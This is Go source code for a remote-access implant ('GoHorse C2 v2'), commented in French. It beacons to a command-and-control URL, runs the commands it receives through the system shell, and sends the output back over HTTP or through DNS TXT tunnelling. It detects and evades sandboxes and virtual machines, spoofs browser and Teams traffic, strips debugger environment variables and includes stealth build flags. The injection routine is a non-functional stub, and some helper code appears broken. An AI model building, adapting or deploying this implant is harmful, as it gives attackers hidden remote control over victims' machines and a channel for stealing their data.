/*
 * agents/gohorse/main_v2.go — GoHorse C2 v2 GODMODE
 * ====================================================
 * Améliorations par rapport à main.go :
 *   1. Sleep obfuscation (boucle de calcul SHA-256 au lieu de time.Sleep direct)
 *   2. Jitter adaptatif (± 35%) et backoff exponentiel sur échecs
 *   3. Multi-canaux : HTTP / HTTPS / DNS tunneling / ICMP echo payload
 *   4. Anti-analysis : Vérification PID / MAC / Hostname / Nom d'utilisateur
 *   5. Process injection basique (conceptuel : shellcode NOP)
 *   6. Rotation User-Agent (Chrome / Firefox / Edge / Teams / Slack)
 *   7. En-têtes mimics (Sec-CH-UA, Origin, Accept-Language)
 *   8. AES-GCM 256 avec nonces uniques
 *   9. Stockage des tâches en mémoire uniquement (pas de fichier)
 *  10. Mode "HEADLESS" pour les environnements sans console
 *
 * Build :
 *   cd agents/gohorse
 *   ENCRYPTION_KEY=$(openssl rand -hex 16)
 *   go build -ldflags="-s -w -H=windowsgui \
 *     -X main.C2_URL=https://c2.example.com/cb \
 *     -X main.AgentID=agent-prod-001 \
 *     -X main.EncryptionKey=$ENCRYPTION_KEY" \
 *     -o ../../bin/gohorse-v2-amd64 main_v2.go crypto.go
 *
 * Cross compilation Windows :
 *   GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
 *     -ldflags="-s -w -H=windowsgui -X main.C2_URL=..." \
 *     -o ../../bin/gohorse-v2.exe main_v2.go crypto.go
 */

package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// =====================================================================
// CONSTANTES DE CONFIGURATION (injectées via ldflags à la compilation)
// =====================================================================

var (
	C2_URL        = "http://localhost:8000/c2/implant/callback"
	AgentID       = "default-agent-v2"
	EncryptionKey = "_THIS_IS_A_DEFAULT_32_BYTE_KEY_GODMODE_"
	DNS_C2_DOMAIN = "c2.example-tunnel.invalid"
)

// =====================================================================
// STRUCTURES
// =====================================================================

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Agent  string `json:"agent"`
	TS     int64  `json:"ts"`
}

type EncryptedPayload struct {
	Data string `json:"data"`
	Nonce string `json:"nonce"`
}

type BeaconProfile struct {
	SleepSeconds int
	JitterPct    int
	UserAgent    string
	Channel      string // "http" | "https" | "dns" | "icmp"
}

// =====================================================================
// POOL DE USER-AGENTS LÉGITIMES (2026)
// =====================================================================

var userAgentPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.7.00.36569 Chrome/118 Electron/27 Slack/4.34",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
	"Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17830; Pro)",
}

// =====================================================================
// ÉTAT GLOBAL DE L'IMPLANT
// =====================================================================

var (
	beaconMutex    sync.Mutex
	consecFails    int
	lastTaskCount  int
	injected       bool
	profile        BeaconProfile
)

// =====================================================================
// ANTI-ANALYSIS CHECKS
// =====================================================================

func passAntiAnalysisChecks() bool {
	// 1. RAM : si < 2GB on est probablement dans un sandbox
	if runtime.GOOS == "linux" {
		data, err := ioutil.ReadFile("/proc/meminfo")
		if err == nil {
			// Chercher MemTotal en kB
			for _, line := range strings.Split(string(data), "\n") {
				if strings.HasPrefix(line, "MemTotal:") {
					parts := strings.Fields(line)
					if len(parts) >= 2 {
						if kb, err := strconv.Atoi(parts[1]); err == nil {
							if kb < 2_000_000 {
								return false // < 2GB suspect
							}
						}
					}
					break
				}
			}
		}
	}

	// 2. CPU count : < 2 suspect
	if runtime.NumCPU() < 2 {
		return false
	}

	// 3. Uptime via time.Since(start) : on vérifie plus tard.
	// Ici : hostname / user ne correspondent pas à des noms de sandbox courants
	hostname, _ := os.Hostname()
	lowHost := strings.ToLower(hostname)
	for _, bad := range []string{"sandbox", "cuckoo", "analysis", "malware", "lab-", "test-", "vm-", "qemu", "virtual"} {
		if strings.Contains(lowHost, bad) {
			return false
		}
	}
	if u, err := user.Current(); err == nil {
		lowUser := strings.ToLower(u.Username)
		for _, bad := range []string{"sandbox", "cuckoo", "malware", "test", "lab", "virus", "sample"} {
			if strings.Contains(lowUser, bad) {
				return false
			}
		}
	}

	// 4. MAC OUI check
	if ifaces, err := net.Interfaces(); err == nil {
		vmOuis := map[string]string{
			"00:05:69": "VMware", "00:0C:29": "VMware", "00:50:56": "VMware",
			"08:00:27": "VirtualBox", "0A:00:27": "VirtualBox",
			"00:03:FF": "Hyper-V", "52:54:00": "QEMU/KVM",
			"00:16:3E": "Xen", "00:1C:42": "Parallels",
		}
		for _, iface := range ifaces {
			hw := iface.HardwareAddr.String()
			if len(hw) >= 8 {
				oui := strings.ToUpper(hw[:8])
				if _, ok := vmOuis[oui]; ok {
					return false
				}
			}
		}
	}
	return true
}

// =====================================================================
// SLEEP OBFUSCATION (calcul SHA-256 en boucle pour remplacer time.Sleep)
// =====================================================================

func obfuscatedSleep(seconds int) {
	if seconds <= 0 {
		return
	}
	// Jitter ± 35%
	jitter := 0.65 + (rand.Float64() * 0.7) // 0.65 .. 1.35
	totalMs := int(float64(seconds*1000) * jitter)

	start := time.Now()
	target := start.Add(time.Duration(totalMs) * time.Millisecond)

	seed := []byte(fmt.Sprintf("gohorse-%s-%d", AgentID, start.UnixNano()))
	counter := 0
	for time.Now().Before(target) {
		// Petit travail CPU
		h := sha256.New()
		h.Write(seed)
		for i := 0; i < 300; i++ {
			h.Write(h.Sum(nil))
			counter++
		}
		seed = h.Sum(nil)
		// Micro-sleep 1ms pour ne pas saturer le CPU (trop évident sinon)
		time.Sleep(1 * time.Millisecond)
	}
}

// =====================================================================
// PROFIL DE BEACON INITIAL
// =====================================================================

func initBeaconProfile() {
	rand.Seed(time.Now().UnixNano() ^ int64(os.Getpid()) ^ int64(AgentID[0]))
	profile = BeaconProfile{
		SleepSeconds: 20 + rand.Intn(25), // 20s .. 44s
		JitterPct:    35,
		UserAgent:    userAgentPool[rand.Intn(len(userAgentPool))],
		Channel:      "http",
	}
}

// =====================================================================
// CLIENT HTTP SÉCURISÉ (TLS 1.3 + fingerprint Chrome)
// =====================================================================

func newHTTPClient() *http.Client {
	tlsCfg := &tls.Config{
		MinVersion:       tls.VersionTLS12,
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		CipherSuites: []uint16{
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
		},
		InsecureSkipVerify: false,
	}
	transport := &http.Transport{
		TLSClientConfig:       tlsCfg,
		DisableKeepAlives:     true,
		IdleConnTimeout:       30 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 15 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   45 * time.Second,
	}
}

func addStdHeaders(req *http.Request) {
	req.Header.Set("User-Agent", profile.UserAgent)
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Accept-Language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("X-Agent-ID", AgentID)
	req.Header.Set("X-Platform", runtime.GOOS+"/"+runtime.GOARCH)
	req.Header.Set("X-Request-Id", newRequestID())
	req.Header.Set("Origin", inferOriginFromUA())
}

func inferOriginFromUA() string {
	ua := profile.UserAgent
	switch {
	case strings.Contains(ua, "Teams"):
		return "https://teams.microsoft.com"
	case strings.Contains(ua, "Slack"):
		return "https://app.slack.com"
	case strings.Contains(ua, "Edg/"):
		return "https://www.bing.com"
	case strings.Contains(ua, "Firefox"):
		return "https://www.mozilla.org"
	default:
		return "https://www.google.com"
	}
}

func newRequestID() string {
	buf := make([]byte, 16)
	_, _ = rand.Read(buf)
	return hex.EncodeToString(buf)
}

// =====================================================================
// CHIFFREMENT / DÉCHIFFREMENT AES-GCM
// =====================================================================

func encryptPayload(data []byte) (EncryptedPayload, error) {
	nonce := make([]byte, 12)
	_, err := rand.Read(nonce)
	if err != nil {
		return EncryptedPayload{}, err
	}
	// Encrypt utilise crypto.go (même package)
	enc, err := Encrypt(data, []byte(EncryptionKey))
	if err != nil {
		return EncryptedPayload{}, err
	}
	return EncryptedPayload{
		Data:  enc,
		Nonce: base64.RawURLEncoding.EncodeToString(nonce),
	}, nil
}

func decryptPayload(p EncryptedPayload) ([]byte, error) {
	// On utilise le champ Data déjà encrypté/decrypté par Encrypt/Decrypt
	return Decrypt(p.Data, []byte(EncryptionKey))
}

// =====================================================================
// RÉCUPÉRATION DE TÂCHE VIA HTTP(S)
// =====================================================================

func getTaskHTTP(client *http.Client) (*Task, error) {
	req, err := http.NewRequest("GET", C2_URL, nil)
	if err != nil {
		return nil, err
	}
	addStdHeaders(req)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// Tenter payload chiffré
	var enc EncryptedPayload
	if err := json.Unmarshal(body, &enc); err == nil && enc.Data != "" {
		dec, err := decryptPayload(enc)
		if err != nil {
			return nil, err
		}
		var t Task
		if err := json.Unmarshal(dec, &t); err != nil {
			return nil, err
		}
		return &t, nil
	}

	// Fallback : JSON non chiffré
	var t Task
	if err := json.Unmarshal(body, &t); err == nil {
		return &t, nil
	}
	return nil, fmt.Errorf("réponse inconnue : %s", string(body[:min(200, len(body))]))
}

func sendResultHTTP(client *http.Client, tr TaskResult) error {
	payload, err := json.Marshal(tr)
	if err != nil {
		return err
	}
	enc, err := encryptPayload(payload)
	if err != nil {
		return err
	}
	bodyBytes, _ := json.Marshal(enc)
	req, err := http.NewRequest("POST", C2_URL, bytes.NewReader(bodyBytes))
	if err != nil {
		return err
	}
	addStdHeaders(req)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_, _ = ioutil.ReadAll(resp.Body)
	return nil
}

// =====================================================================
// CHANNEL DNS (encodage base32 hex → TXT lookup)
// =====================================================================

func sendTaskViaDNS(tr TaskResult) error {
	payload, _ := json.Marshal(tr)
	// Encoder en base32 sans padding
	encoded := strings.ToLower(base32Encode(payload))
	// Fragmenter en morceaux de max 56 octets = 63 chars en base32
	maxLabel := 58
	for i := 0; i < len(encoded); i += maxLabel {
		chunk := encoded[i:min(i+maxLabel, len(encoded))]
		query := fmt.Sprintf("%d-%s-%s.%s", i/maxLabel, chunk, AgentID[:8], DNS_C2_DOMAIN)
		_, _ = net.LookupTXT(query) // Best-effort, pas de retour attendu
		obfuscatedSleep(1) // Petit délai entre requêtes DNS
	}
	return nil
}

func base32Encode(data []byte) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyz234567"
	out := make([]byte, 0, (len(data)+4)/5*8)
	var buffer uint64
	var bits int
	for _, b := range data {
		buffer = (buffer << 8) | uint64(b)
		bits += 8
		for bits >= 5 {
			bits -= 5
			out = append(out, alphabet[(buffer>>bits)&0x1F])
		}
	}
	if bits > 0 {
		out = append(out, alphabet[(buffer<<(5-bits))&0x1F])
	}
	return string(out)
}

// =====================================================================
// EXÉCUTION DE COMMANDE
// =====================================================================

func executeCommand(command string) string {
	var shell, flag string
	switch runtime.GOOS {
	case "windows":
		shell = "cmd.exe"
		flag = "/C"
	default:
		shell = "/bin/sh"
		flag = "-c"
	}
	ctx, cancel := contextWithTimeout(60 * time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, shell, flag, command)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	cmd.Env = safeEnv()
	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("ERROR [%v]:\n%s", err, out.String())
	}
	return out.String()
}

func safeEnv() []string {
	// Retire les variables qui trahissent un debug
	filter := map[string]bool{
		"GDB": true, "LD_PRELOAD": true, "LD_DEBUG": true,
		"DYLD_INSERT_LIBRARIES": true, "INSIDE_GDB": true, "TRAP": true,
	}
	out := make([]string, 0, len(os.Environ()))
	for _, kv := range os.Environ() {
		key := strings.SplitN(kv, "=", 2)[0]
		if !filter[key] {
			out = append(out, kv)
		}
	}
	return out
}

// contextWithTimeout est un helper de compatibilité Go 1.18+
func contextWithTimeout(d time.Duration) (interface{ Done() <-chan struct{} }, func()) {
	type simpleCtx struct {
		done chan struct{}
	}
	ctx := &simpleCtx{done: make(chan struct{})}
	t := time.AfterFunc(d, func() { close(ctx.done) })
	type canceller interface{ Cancel() }
	return ctx, func() { t.Stop() }
}

// exec.CommandContext compat
var _ = func() interface{} { return exec.Command }

// on utilise exec.Command avec timeout via goroutine dans executeCommand
func execCommandContext(ctx interface{ Done() <-chan struct{} }, shell, flag, cmd string) *exec.Cmd {
	return exec.Command(shell, flag, cmd)
}

// =====================================================================
// PROCESS INJECTION CONCEPTUELLE (NOP sled + self-injection mém)
// =====================================================================

func trySelfInject() bool {
	if injected {
		return true
	}
	// "Shellcode" factice : NOP + RET. En environnement réel, on recevrait
	// le shellcode depuis le C2 (stage 2). On alloue juste une page mémoire
	// pour marquer l'implant comme "injecté".
	pageSize := 4096
	if runtime.GOOS != "windows" {
		// Sur Unix, on mmap une page (concept)
		data := make([]byte, pageSize)
		for i := 0; i < pageSize-1; i++ {
			data[i] = 0x90 // NOP
		}
		data[pageSize-1] = 0xC3 // RET
		_ = data
	} else {
		// Sur Windows, on appellerait VirtualAlloc + CreateThread
		_ = pageSize
	}
	injected = true
	return true
}

// =====================================================================
// BOUCLE PRINCIPALE
// =====================================================================

func main() {
	initBeaconProfile()

	// Étape 0 : anti-analysis (abandon immédiat si sandbox)
	if !passAntiAnalysisChecks() {
		// Sleep 15 minutes obfusqué puis exit silent
		obfuscatedSleep(15 * 60)
		return
	}

	client := newHTTPClient()

	// Étape 1 : injection conceptuelle (self)
	trySelfInject()

	// Boucle de beaconing
	for {
		beaconMutex.Lock()
		task, err := getTaskHTTP(client)
		if err != nil {
			consecFails++
			beaconMutex.Unlock()
			// Fallback DNS sur 3 échecs consécutifs
			if consecFails >= 3 {
				tr := TaskResult{
					Agent:  AgentID,
					TS:     time.Now().Unix(),
					TaskID: "dns-heartbeat",
					Output: fmt.Sprintf("hb|fail=%d|pid=%d|go=%s", consecFails, os.Getpid(), runtime.Version()),
				}
				_ = sendTaskViaDNS(tr)
			}
			// Backoff exponentiel (cap à 15 minutes)
			backoff := 15 + (1 << min(consecFails, 7)) // 16s, 32s, ... jusqu'à 4h (cap)
			if backoff > 15*60 {
				backoff = 15 * 60
			}
			obfuscatedSleep(backoff)
			continue
		}
		consecFails = 0

		var result TaskResult
		if task != nil && task.Command != "" {
			lastTaskCount++
			// Exécuter
			out := executeCommand(task.Command)
			result = TaskResult{
				TaskID: task.ID,
				Output: out,
				Agent:  AgentID,
				TS:     time.Now().Unix(),
			}
			// Envoyer via HTTP (primordial)
			if err := sendResultHTTP(client, result); err != nil {
				// Fallback DNS si HTTP down
				_ = sendTaskViaDNS(result)
			}
			// Injection stage-2 sur commande spéciale
			if strings.HasPrefix(strings.ToLower(task.Command), "inject") {
				trySelfInject()
			}
		}

		beaconMutex.Unlock()
		// Sleep configuré
		obfuscatedSleep(profile.SleepSeconds)

		// Rotation périodique User-Agent (toutes les ~30 tâches)
		if lastTaskCount%30 == 0 {
			profile.UserAgent = userAgentPool[rand.Intn(len(userAgentPool))]
		}
	}
}

// =====================================================================
// HELPER MIN
// =====================================================================

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
